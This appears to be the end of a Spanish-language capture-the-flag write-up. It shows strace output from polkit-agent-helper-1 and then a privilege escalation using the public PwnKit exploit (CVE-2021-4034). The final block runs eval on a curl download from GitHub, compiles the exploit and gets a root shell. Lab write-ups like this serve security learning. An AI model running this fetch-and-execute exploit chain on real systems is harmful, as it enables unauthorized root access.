fstat(3, {st_mode=S_IFREG|0644, st_size=174472, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x706f936cd000
mmap(NULL, 181960, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f936a0000
mmap(0x706f936a6000, 118784, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x706f936a6000
mmap(0x706f936c3000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0x706f936c3000
mmap(0x706f936c9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x29000) = 0x706f936c9000
mmap(0x706f936cb000, 5832, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x706f936cb000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libcap.so.2", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\340\201\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=51536, ...}) = 0
mmap(NULL, 49224, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93693000
mmap(0x706f93696000, 24576, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x706f93696000
mmap(0x706f9369c000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x9000) = 0x706f9369c000
mmap(0x706f9369e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb000) = 0x706f9369e000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgcrypt.so.20", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=1340976, ...}) = 0
mmap(NULL, 1340272, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f9354b000
mmap(0x706f9355a000, 999424, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xf000) = 0x706f9355a000
mmap(0x706f9364e000, 241664, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x103000) = 0x706f9364e000
mmap(0x706f93689000, 36864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13e000) = 0x706f93689000
mmap(0x706f93692000, 880, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x706f93692000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/liblz4.so.1", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=137440, ...}) = 0
mmap(NULL, 135264, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93529000
mmap(0x706f9352c000, 110592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x706f9352c000
mmap(0x706f93547000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e000) = 0x706f93547000
mmap(0x706f93549000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x20000) = 0x706f93549000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/liblzma.so.5", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=202904, ...}) = 0
mmap(NULL, 200728, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f934f7000
mmap(0x706f934fa000, 139264, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x3000) = 0x706f934fa000
mmap(0x706f9351c000, 45056, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x706f9351c000
mmap(0x706f93527000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x30000) = 0x706f93527000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libzstd.so.1", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=755864, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x706f934f5000
mmap(NULL, 757816, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f9343b000
mmap(0x706f9343f000, 684032, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4000) = 0x706f9343f000
mmap(0x706f934e6000, 53248, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xab000) = 0x706f934e6000
mmap(0x706f934f3000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xb7000) = 0x706f934f3000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libblkid.so.1", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=236592, ...}) = 0
mmap(NULL, 238520, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f93400000
mmap(0x706f93407000, 147456, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7000) = 0x706f93407000
mmap(0x706f9342b000, 36864, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2b000) = 0x706f9342b000
mmap(0x706f93434000, 28672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x33000) = 0x706f93434000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libgpg-error.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=149760, ...}) = 0
mmap(NULL, 147880, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x706f933db000
mmap(0x706f933df000, 90112, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x4000) = 0x706f933df000
mmap(0x706f933f5000, 36864, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a000) = 0x706f933f5000
mmap(0x706f933fe000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0x706f933fe000
close(3)                                = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x706f933d9000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x706f933d7000
arch_prctl(ARCH_SET_FS, 0x706f933d7d80) = 0
set_tid_address(0x706f933d8050)         = 52919
set_robust_list(0x706f933d8060, 24)     = 0
rseq(0x706f933d86a0, 0x20, 0, 0x53053053) = 0
mprotect(0x706f93bff000, 16384, PROT_READ) = 0
mprotect(0x706f933fe000, 4096, PROT_READ) = 0
mprotect(0x706f93434000, 24576, PROT_READ) = 0
mprotect(0x706f934f3000, 4096, PROT_READ) = 0
mprotect(0x706f93527000, 4096, PROT_READ) = 0
mprotect(0x706f93549000, 4096, PROT_READ) = 0
mprotect(0x706f93689000, 20480, PROT_READ) = 0
mprotect(0x706f9369e000, 4096, PROT_READ) = 0
mprotect(0x706f93cab000, 4096, PROT_READ) = 0
mprotect(0x706f936c9000, 4096, PROT_READ) = 0
mprotect(0x706f93719000, 8192, PROT_READ) = 0
mprotect(0x706f93736000, 4096, PROT_READ) = 0
mprotect(0x706f9382e000, 4096, PROT_READ) = 0
mprotect(0x706f93f11000, 4096, PROT_READ) = 0
mprotect(0x706f9373d000, 4096, PROT_READ) = 0
mprotect(0x706f93745000, 4096, PROT_READ) = 0
mprotect(0x706f93cb9000, 4096, PROT_READ) = 0
mprotect(0x706f93d8e000, 45056, PROT_READ) = 0
mprotect(0x706f93f73000, 12288, PROT_READ) = 0
mprotect(0x706f939f5000, 32768, PROT_READ) = 0
mprotect(0x706f93dbb000, 4096, PROT_READ) = 0
mprotect(0x706f93f95000, 4096, PROT_READ) = 0
mprotect(0x706f93fa6000, 4096, PROT_READ) = 0
mprotect(0x55c06f3e3000, 4096, PROT_READ) = 0
mprotect(0x706f93ffc000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x706f93fa8000, 88059)           = 0
getrandom("\xe8\x4a\x69\xd3\xb1\x40\x62\x56", 8, GRND_NONBLOCK) = 8
brk(NULL)                               = 0x55c0819fe000
brk(0x55c081a1f000)                     = 0x55c081a1f000
prctl(PR_CAPBSET_READ, CAP_MAC_OVERRIDE) = 1
prctl(PR_CAPBSET_READ, 0x30 /* CAP_??? */) = -1 EINVAL (Argumento inválido)
prctl(PR_CAPBSET_READ, CAP_CHECKPOINT_RESTORE) = 1
prctl(PR_CAPBSET_READ, 0x2c /* CAP_??? */) = -1 EINVAL (Argumento inválido)
prctl(PR_CAPBSET_READ, 0x2a /* CAP_??? */) = -1 EINVAL (Argumento inválido)
prctl(PR_CAPBSET_READ, 0x29 /* CAP_??? */) = -1 EINVAL (Argumento inválido)
statfs("/sys/fs/selinux", 0x7fffa3db8260) = -1 ENOENT (No existe el archivo o el directorio)
statfs("/selinux", 0x7fffa3db8260)      = -1 ENOENT (No existe el archivo o el directorio)
openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
read(3, "nodev\tsysfs\nnodev\ttmpfs\nnodev\tbd"..., 1024) = 407
read(3, "", 1024)                       = 0
close(3)                                = 0
access("/etc/selinux/config", F_OK)     = -1 ENOENT (No existe el archivo o el directorio)
openat(AT_FDCWD, "/proc/sys/kernel/cap_last_cap", O_RDONLY) = 3
fstatfs(3, {f_type=PROC_SUPER_MAGIC, f_bsize=4096, f_blocks=0, f_bfree=0, f_bavail=0, f_files=0, f_ffree=0, f_fsid={val=[0x19, 0]}, f_namelen=255, f_frsize=4096, f_flags=ST_VALID|ST_NOSUID|ST_NODEV|ST_NOEXEC|ST_RELATIME}) = 0
read(3, "40\n", 7)                      = 3
close(3)                                = 0
prctl(PR_CAPBSET_READ, CAP_CHOWN)       = 1
prctl(PR_GET_SECUREBITS)                = 0
prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0)  = 0
prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_IS_SET, CAP_CHOWN, 0, 0) = 0
futex(0x706f93f12de8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
futex(0x706f93f12de8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
geteuid()                               = 1000
write(2, "polkit-agent-helper-1: needs to "..., 47polkit-agent-helper-1: needs to be setuid root
) = 47
fstat(1, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
write(1, "PAM_ERROR_MSG Incorrect permissi"..., 89) = 89
write(1, "FAILURE\n", 8)                = 8
fdatasync(1)                            = -1 EINVAL (Argumento inválido)
fdatasync(2)                            = -1 EINVAL (Argumento inválido)
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=100000000}, NULL) = 0
exit_group(1)                           = ?
+++ exited with 1 +++
```

Encontramos lineas interesantes:

`polkit-agent-helper-1: needs to be setuid root` indica que debería tener setuid root, pero no lo tiene.

Si buscamos `polkit cve setuid`, encontramos la siguiente vulnerabilidad:

https://www.alibabacloud.com/help/en/ecs/vulnerability-announcement-or-linux-polkit-privilege-escalation-vulnerability

Encontramos un exploit:
https://github.com/berdav/CVE-2021-4034/tree/main

```bash
[magellan@venus ~]$ eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
sh-5.1# whoami
root
```

